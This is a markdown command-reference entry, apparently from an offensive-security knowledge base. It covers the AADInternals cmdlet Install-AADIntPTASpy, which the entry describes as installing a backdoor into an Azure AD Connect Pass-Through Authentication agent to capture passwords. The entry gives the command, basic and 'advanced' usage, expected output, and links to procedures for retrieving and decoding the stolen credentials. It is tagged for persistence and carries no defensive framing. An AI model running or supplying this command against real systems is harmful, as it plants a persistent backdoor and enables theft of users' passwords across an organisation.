---
type: command
executor: powershell
data: Install-AADIntPTASpy
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - persistence
  - azure-ad
verified: true
validated: true
---

# install-aadint-ptaspy

## Command

```powershell
Install-AADIntPTASpy
```

## Description

This PowerShell cmdlet from the AADInternals module installs a backdoor spy into the Azure AD Connect Pass-Through Authentication (PTA) agent, enabling the capture of authentication requests and passwords on the target server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; uses default configuration for the current PTA installation. | No |

## Examples

### Basic Usage

```powershell
Install-AADIntPTASpy
```

Run after importing AADInternals module to deploy the spy.

### Advanced Usage

```powershell
# No additional options; always defaults to current environment
Install-AADIntPTASpy
```

## Expected Output

Success message indicating installation complete, e.g., "PTA Spy installed successfully. Logging enabled."
No output on failure; check PowerShell errors for issues like insufficient privileges.

## Related

- [[procedures/Install-Azure-AD-Connect-PTA-Backdoor-and-Retrieve-Logs]]
- [[commands/get-aadint-ptaspy-log-decode-passwords]]
